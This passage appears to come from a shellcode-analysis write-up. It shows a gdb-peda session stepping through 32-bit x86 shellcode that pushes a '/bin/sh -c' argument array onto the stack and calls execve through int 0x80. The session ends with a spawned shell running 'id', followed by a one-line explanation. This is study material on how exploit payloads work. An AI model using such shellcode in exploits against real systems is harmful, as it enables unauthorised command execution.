EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6b2 --> 0xbffff6c6 --> 0x632d ('-c')
EIP: 0x804a066 --> 0xcde18953
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x804a066 <code+38>:	push   ebx ; ptr to '/bin/sh'
   0x804a067 <code+39>:	mov    ecx,esp
   0x804a069 <code+41>:	int    0x80
   0x804a06b <code+43>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b2 --> 0xbffff6c6 --> 0x632d ('-c')
0004| 0xbffff6b6 --> 0x804a05d ("/bin/sh")
0008| 0xbffff6ba --> 0x0 
0012| 0xbffff6be ("/bin/sh")
0016| 0xbffff6c2 --> 0x68732f ('/sh')
0020| 0xbffff6c6 --> 0x632d ('-c')
0024| 0xbffff6ca --> 0x84300000 
0028| 0xbffff6ce --> 0x85100804 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a066 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff6be ("/bin/sh")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6ae --> 0xbffff6be ("/bin/sh")
EIP: 0x804a067 --> 0x80cde189
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a061 <code+33>:	das    
   0x804a062 <code+34>:	jae    0x804a0cc
   0x804a064 <code+36>:	add    BYTE PTR [edi+0x53],dl
=> 0x804a067 <code+39>:	mov    ecx,esp ; ptr to function params
   0x804a069 <code+41>:	int    0x80
   0x804a06b <code+43>:	add    BYTE PTR [eax],al
   0x804a06d:	add    BYTE PTR [eax],al
   0x804a06f:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6ae --> 0xbffff6be ("/bin/sh")
0004| 0xbffff6b2 --> 0xbffff6c6 --> 0x632d ('-c')
0008| 0xbffff6b6 --> 0x804a05d ("/bin/sh")
0012| 0xbffff6ba --> 0x0 
0016| 0xbffff6be ("/bin/sh")
0020| 0xbffff6c2 --> 0x68732f ('/sh')
0024| 0xbffff6c6 --> 0x632d ('-c')
0028| 0xbffff6ca --> 0x84300000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a067 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff6be ("/bin/sh")
ECX: 0xbffff6ae --> 0xbffff6be ("/bin/sh")
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6ae --> 0xbffff6be ("/bin/sh")
EIP: 0x804a069 --> 0x80cd
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a062 <code+34>:	jae    0x804a0cc
   0x804a064 <code+36>:	add    BYTE PTR [edi+0x53],dl
   0x804a067 <code+39>:	mov    ecx,esp
=> 0x804a069 <code+41>:	int    0x80 ; calls (sys_execve) 
   0x804a06b <code+43>:	add    BYTE PTR [eax],al
   0x804a06d:	add    BYTE PTR [eax],al
   0x804a06f:	add    BYTE PTR [eax],al
   0x804a071 <dtor_idx.6161+1>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff6ae --> 0xbffff6be ("/bin/sh")
0004| 0xbffff6b2 --> 0xbffff6c6 --> 0x632d ('-c')
0008| 0xbffff6b6 --> 0x804a05d ("/bin/sh")
0012| 0xbffff6ba --> 0x0 
0016| 0xbffff6be ("/bin/sh")
0020| 0xbffff6c2 --> 0x68732f ('/sh')
0024| 0xbffff6c6 --> 0x632d ('-c')
0028| 0xbffff6ca --> 0x84300000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a069 in code ()
gdb-peda$ s
process 1357 is executing new program: /bin/dash
[New process 1360]
process 1360 is executing new program: /bin/dash
$ id
[New process 1361]
process 1361 is executing new program: /usr/bin/id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),999(admin)
$ [Inferior 3 (process 1361) exited normally]
Warning: not running or target is remote
gdb-peda$ 
```

The shellcode creates the argument structure on the stack pointing to '/bin/sh' command, then executes it through the execve system call.